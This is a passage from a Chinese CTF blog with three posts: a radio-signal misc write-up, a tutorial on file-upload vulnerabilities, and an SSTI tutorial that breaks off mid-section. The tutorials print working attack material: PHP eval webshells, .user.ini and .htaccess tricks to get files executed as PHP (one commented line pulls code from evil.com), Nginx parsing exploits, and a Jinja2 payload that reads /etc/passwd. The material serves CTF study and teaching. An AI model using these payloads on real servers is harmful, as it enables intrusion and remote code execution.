title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p><p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p><p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p><p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p><p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p><p>那么将压缩包复制到Ubuntu</p><pre><code class="highlight bash">unzip ezSignal_fix.zip<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre><p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p><p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p><p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p><p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p><p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p><pre><code class="highlight plaintext">import numpy as npfrom scipy.io import wavfilefrom scipy.signal import butter, lfilterdef read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):    &quot;&quot;&quot;    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）    - dtype: 数据类型（默认 float32）    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）    &quot;&quot;&quot;    # 以二进制模式读取文件    with open(filename, &quot;rb&quot;) as f:        raw_bytes = f.read()    # 转换为指定字节序和类型的 numpy 数组dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)data = np.frombuffer(raw_bytes, dtype=dt)return datadef main():    # 参数配置（与 GRC 一致）     samp_rate = 48000      # 音频采样率     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）     max_dev = 5e3          # FM最大频偏     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）try:    # 1. 读取I/Q数据（二进制模式）     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)    # 检查长度一致性     if len(i_data) != len(q_data):         raise ValueError(&quot;I/Q数据长度不一致！&quot;)    # 2. 合并为复数信号（I + jQ）     complex_signal = i_data + 1j * q_data    # 3. FM解调（相位差分法）     phase = np.unwrap(np.angle(complex_signal))     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate     demodulated = demodulated.astype(np.float32)    # 4. 重采样到音频采样率（48 kHz）     demodulated_resampled = demodulated[::4]  # 简单下采样    # 5. 低通滤波（300-5000 Hz，与GRC一致）     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)     demodulated_resampled = lfilter(b, a, demodulated_resampled)    # 6. 归一化并保存为WAV     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)except FileNotFoundError:    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)except Exception as e:    print(f&quot;错误：&#123;str(e)&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p><p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p><p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> -CTF -Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾)</p><h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><p>前端检测上传文件的后缀，js检测直接禁用js</p><h2 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h2><h3 id="检测content-type"><a href="#检测content-type" class="headerlink" title="检测content-type"></a>检测content-type</h3><p>检测你发包的Content-Type参数来判断文件上传类型</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416151018927.png" alt="image-20250416151018927"></p><p>一般你改一下content-type就可以绕过了</p><h3 id="检测文件头判断文件类型"><a href="#检测文件头判断文件类型" class="headerlink" title="检测文件头判断文件类型"></a>检测文件头判断文件类型</h3><p>字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头</p><p>这种时候伪造一下就可以</p><pre><code class="highlight scss"><span class="built_in">gif</span>(GIF89a) : <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> jpg、jpeg : FF D8 FF png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</code></pre><p>用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测，或者你直接在包的头写个GIF89a也是可以过的</p><h3 id="后端检测文件拓展名"><a href="#后端检测文件拓展名" class="headerlink" title="后端检测文件拓展名"></a>后端检测文件拓展名</h3><p>用拓展名的黑名单来检测文件拓展名从而防止危险文件的上传</p><p>绕过:</p><p>1)使用一些特殊扩展名来绕过,<code>php</code>可以用php3、php4、php5代替</p><p>2)大小写混淆绕过</p><p>3)在文件名后加<code>.</code>(空格，点，空格)，利用windows特性绕过</p><p>4)在文件名后加<code>::$data</code>绕过(<strong>NTFS流</strong>读入)</p><p>5)有替换的话可以双写绕过</p><hr><p>当然也可以是白名单只让特定的文件上传</p><p>绕过:</p><p>存储路径可以使用%00在最后进行截断，（注意：GET型可以对%00自动解码，但POST型不能，需要在二进制中修改&#x2F;&#x2F;打开你的010喵，用空格占个位来输00）</p><h3 id="后端检测文件内容"><a href="#后端检测文件内容" class="headerlink" title="后端检测文件内容"></a>后端检测文件内容</h3><h4 id="文件内容替换"><a href="#文件内容替换" class="headerlink" title="文件内容替换"></a>文件内容替换</h4><p>检测原理：</p><p>在后端处理上传的文件时，会将将文件中的敏感字符替换掉。<br>参考代码</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$content</span>);<span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>)) &#123;        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);        <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;&#125; <span class="keyword">else</span> &#123;        <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;&#125;<span class="meta">?&gt;</span></code></pre><p>绕过方法：<br>根据实际过滤的字符来判断，（一般不会限制所有敏感字符，因为还要兼顾图片上传）</p><h4 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h4><p>检测原理：<br>后端调用了<code>php</code>的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p><p>绕过方法：<br>比较过滤前后文件内容，一般不会全部过滤。<br>比较使用<code>php-gd</code>转换之前和之后的gif图像，并搜索它们之间的任何相似性，因此，如果我在原始文件中找到相似的部分，则在使用<code>php-gd</code>转换后也保留了该部分然后我可以在那部分注入我的PHP代码并获得RCE</p><h3 id="5-条件竞争"><a href="#5-条件竞争" class="headerlink" title="5.条件竞争"></a>5.条件竞争</h3><p>该漏洞形成逻辑：<br>网站允许上传文件，然后检查上传文件是否包含<code>webshell</code>、是否是指定的文件类型。如果不是，那么删除该文件。在删除之前访问上传的<code>php</code>文件，从而执行上传文件中的<code>php</code>代码。</p><p>绕过方法：<br>先进行文件上传，后进行判断与删除。利用时间差进行<code>webshell</code>上传。<br>竞争条件代码举例：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($\_POST\[&quot;cmd&quot;\])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></code></pre><p>判断是否删除</p><pre><code class="highlight python"><span class="keyword">import</span> requests  <span class="keyword">while</span> true:  requests.get(”路径“)</code></pre><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>当文件完全被ban，只用以图片类型上传的时候，我们该怎么办呢</p><h3 id="上传-htaccess文件绕过"><a href="#上传-htaccess文件绕过" class="headerlink" title="上传.htaccess文件绕过"></a>上传.htaccess文件绕过</h3><p><code>.htaccess</code>文件是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p><p><code>.htaccess</code>主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p><p><code>.htaccess</code>的用途范围主要针对当前目录</p><p>类似内容</p><pre><code class="highlight plaintext">ForceType application/x-httpd-phpSetHandler application/x-httpd-php这些都会把上传的文件强制解析为php</code></pre><h3 id="上传-user-ini文件绕过"><a href="#上传-user-ini文件绕过" class="headerlink" title="上传.user.ini文件绕过"></a>上传.user.ini文件绕过</h3><p><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<strong>fastcgi</strong>运行的<code>php</code>都可以用这个方法。</p><p>那么什么是<code>.user.ini</code>？这得从<code>php.ini</code>说起了。<code>php.ini</code>是<code>php</code>默认的配置文件，其中包括了很多<code>php</code>的配置，这些配置中，又分为几种：<em>PHP_INI_SYSTEM</em>、<em>PHP_INI_PERDIR</em>、<em>PHP_INI_ALL</em>、<em>PHP_INI_USER</em>。在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p><p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8d6872811ad6ca771a0debab4f7a50ce.png" alt="img"></p><p>除了主 <code>php.ini </code>之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p><p>所以除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。我们可以很容易地借助<code>.user.ini</code>文件，更改<code>auto_prepend_file</code>配置项，来构造一个“后门”。</p><p>比如，某网站限制不允许上传<code>.php</code>文件，你便可以上传一个<code>.user.ini</code>，再上传一个图片马，包含起来进行<code>getshell</code>。不过前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p><p>实例([SUCTF 2019]CheckIn1):</p><pre><code class="highlight javascript">$userdir = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_">md5</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);<span class="keyword">if</span> (!<span class="title function_">file_exists</span>($userdir)) &#123;    <span class="title function_">mkdir</span>($userdir, <span class="number">0777</span>, <span class="literal">true</span>);&#125;<span class="title function_">file_put_contents</span>($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);<span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];    <span class="keyword">if</span> (!$tmp_name) &#123;        <span class="title function_">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);    &#125;    <span class="keyword">if</span> (!$name) &#123;        <span class="title function_">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);    &#125;    $extension = <span class="title function_">substr</span>($name, <span class="title function_">strrpos</span>($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);    <span class="keyword">if</span> (<span class="title function_">preg_match</span>(<span class="string">&quot;/ph|htaccess/i&quot;</span>, $extension)) &#123;        <span class="title function_">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);    &#125;    <span class="keyword">if</span> (<span class="title function_">mb_strpos</span>(<span class="title function_">file_get_contents</span>($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="variable constant_">FALSE</span>) &#123;        <span class="title function_">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);    &#125;    $image_type = <span class="title function_">exif_imagetype</span>($tmp_name);    <span class="keyword">if</span> (!$image_type) &#123;        <span class="title function_">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);    &#125;    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;    <span class="title function_">move_uploaded_file</span>($tmp_name, $upload_file_path);    echo <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;    echo <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;    <span class="title function_">var_dump</span>(<span class="title function_">scandir</span>($userdir));&#125;</code></pre><p><strong>绕过技巧</strong>：</p><p>1.针对过滤包含<code>ph</code>与<code>htaccess</code>扩展名的文件：上传<code>.user.ini</code>与图片马，利用<code>.user.ini</code>进行文件包含2.针对过滤文件内容包含<code>&lt;?</code>的文件：使用<code>php</code>的脚本标记风格<code>&lt;script language=&#39;php&#39;&gt;</code>3.针对使用<code>exif_imagetype</code>规定了必须为图片类型的文件：添加文件头内容或合成图片马（稍后会讲）</p><p>首先上传<code>.user.ini</code>文件，文件内容为：</p><pre><code class="highlight javascript"><span class="title class_">GIF89</span>aauto_prepend_file=shell.<span class="property">png</span></code></pre><p>然后构造一个<code>shell.png</code>，内容如下：</p><pre><code class="highlight javascript"><span class="title class_">GIF89</span>a&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); &lt;/script&gt;</code></pre><p>然后将两个文件分别上传到服务器上，拿到回显</p><h2 id="Ngnix解析漏洞"><a href="#Ngnix解析漏洞" class="headerlink" title="Ngnix解析漏洞"></a>Ngnix解析漏洞</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>对于任意文件名，在后面添加<code>/abc.php</code>(abc为任意字符)后，即可将文件作为php解析</p><p><strong>漏洞机理</strong></p><p>Nginx配置导致，而非nginx版本问题，而取决于php的配置文件 php.ini 文件中是否开启了<code> cgi.fix_pathinfo</code></p><p>当访问<code>xxx.jpg/abc.php</code>时，nginx查看URL后发现以php结尾，并将路径传递给<code>phpfastcgi</code>处理程序，php看到<code>xxx.jpg/abc.php</code>不存在，便删除去最后的<code>/abc.php</code>，看到<code>xxx.jpg</code>存在，而后以<code>php</code>的形式执行<code>xxx.jpg</code>的内容</p><p>大概的来说，就是<code>cgi.fix_pathinfo</code>会对形如<code>/1.aaa/2.bbb/3.cccc</code>的文件路径进行处理，若该路径不存在，则会去掉最后的子路径再次判断直到找到一个存在的路径。</p><p>若关闭该选项，访问<code>/xxx.jpg/abc.php</code>会返回找不到文件，但关闭该选项可能会导致一些其他错误，所以默认开启。</p><p>在高版本中，引入了<code>security.limit_extensions</code>来纠正这个错误，限制了可执行文件的后缀，默认只允许执行<code>.php</code>文件。防止这一问题(回显Access denied)</p><h3 id="空字节RCE"><a href="#空字节RCE" class="headerlink" title="空字节RCE"></a>空字节RCE</h3><p>Nginx在遇到%00空字节时与后段<code>FastCGI</code>处理不一致，导致可以在图中嵌入PHP代码然后通过访问<code>1.jpg%00.php</code>来执行其中的代码。</p><p><strong>影响版本</strong></p><pre><code class="highlight plaintext">nginx 0.5.*nginx 0.6.*nginx 0.7 &lt;= 0.7.65nginx 0.8 &lt;= 0.8.37</code></pre><p>该漏洞不受cgi.fix_pathinfo影响，当为0时，依旧可以解析</p><h3 id="CVE-2013-4547-20-00"><a href="#CVE-2013-4547-20-00" class="headerlink" title="CVE-2013-4547(%20%00)"></a>CVE-2013-4547(%20%00)</h3><p><strong>影响版本</strong></p><pre><code class="highlight plaintext">nginx 0.8.41 ~ 1.5.6</code></pre><p>原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.jpg ”，注意文件名的最后一个字符是空格。则可以通过访问：<code>http://127.0.0.1/file.jpg \0.php</code> </p><p>让Nginx认为文件“file.jpg ”的后缀为<code>.php</code></p><p>来测试下，这次测试在Nginx&#x2F;1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。</p><p>测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：<code>http://192.168.56.101/test.htmlAAAjpg </code>,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如图<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194656774-1403436835.png" alt="1964477-20200308194656774-1403436835"></p><p>修改完毕后Forward该请求，在浏览器中看到：</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194716298-1059932045.png" alt="1964477-20200308194716298-1059932045"></p><p>我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。</p><p>继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，上传到服务器。文件内容为：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre><p>用Burp Suite抓包并修改，原本的URL是：<code>http://192.168.56.101/test.jpg…php</code> ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194746793-602361880.png" alt="1964477-20200308194746793-602361880"></p><p>修改完毕后 Forword 该请求，在浏览器中看到：Access denied ，好吧，又是这个。</p><p>这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。但是由于<code>security.limit_extensions</code>的存在，导致我们并不能利用此漏洞</p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p><code>Apache</code>从右向左判断解析文件,若无法解析再继续向左判断,如<code>1.php.owf.rar</code>这个文件名，<code>Apache</code>无法解析<code>.owf</code>和<code>.rar</code>两个后缀，于是继续向前解析将其解析为1.php</p><p>实际上许多后缀都可以被解析为php文件进行处理，这里贴一下其他师傅的文章</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250417211410728.png" alt="image-20250417211410728"></p><pre><code class="highlight plaintext">原链接:https://www.cnblogs.com/yokan/p/12444476.html</code></pre><h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>是Apache下的一个配置文件，负责相关目录下的网页配置。通过<code> .htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 <code>httpd.conf</code> 文件中配置。</p><pre><code class="highlight plaintext">生效前提:AllowOverride被启用mod_rewrite 模块开启</code></pre><p>这里放几个常用的配置</p><pre><code class="highlight plaintext">#1：这个.htaccess的意思就是把所有名字里面含有shell的文件当成php脚本来执行&lt;FilesMatch   &quot;shell&quot;&gt; SetHandler  application/x-httpd-php &lt;/FilesMatch&gt;#2：这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析AddType application/x-httpd-php .jpg#php_value auto_append_file .htaccess#Options ExecCGIAddHandler cgi-script .jpg#Options +ExecCGIAddHandler fcgid-script .gifFcgidWrapper &quot;/bin/bash&quot; .gif#php_flag allow_url_include 1php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B#php_value auto_append_file https://evil.com/evil-code.txt</code></pre><h3 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h3><p>在文件后缀后加上<code>%0a</code>，绕过getshell</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置 <code>Options +Indexes</code> 时Apache存在目录遍历漏洞。</p><h3 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h3><p><code>xx.jpg/xx.php</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> -CTF -Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI漏洞</title>
      <link href="/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI-模板注入-漏洞"><a href="#SSTI-模板注入-漏洞" class="headerlink" title="SSTI(模板注入)漏洞"></a>SSTI(模板注入)漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p><p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p><h2 id="确定漏洞"><a href="#确定漏洞" class="headerlink" title="确定漏洞"></a>确定漏洞</h2><p>贴个图</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti.png" alt="ssti"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti2.png" alt="ssti2"></p><h3 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h3><ul><li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li><li>在Mako模板引擎中我们也是${}形式的</li></ul><h3 id="第二层："><a href="#第二层：" class="headerlink" title="第二层："></a>第二层：</h3><ul><li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li><li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li></ul><h3 id="第三层："><a href="#第三层：" class="headerlink" title="第三层："></a>第三层：</h3><ul><li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li><li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li></ul><p>接下来就进入不同模板的不同注入方式</p><h2 id="Python模板注入"><a href="#Python模板注入" class="headerlink" title="Python模板注入"></a>Python模板注入</h2><h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><p>python的一种主流模板，基本你看到页面在输入后会实时回显在页面并且发包后看出语言是python基本就能确认是</p><pre><code class="highlight plaintext">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre><p>这里先简单介绍一下jinja2的语法好了</p><h4 id="语法结构"><a href="#语法结构" class="headerlink" title="语法结构"></a>语法结构</h4><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取</p><p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p><p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;         <li>&#123;&#123;comment&#125;&#125;</li>    &#123;% endfor %&#125;&lt;ul&gt;</code></p><p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p><pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre><p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p><pre><code class="highlight plaintext">from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)    return t.render(n=name)if __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p><pre><code class="highlight plaintext">&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句例子:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;file&#x27; %&#125;&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; &#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出 &#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释 #...# for Line Statements 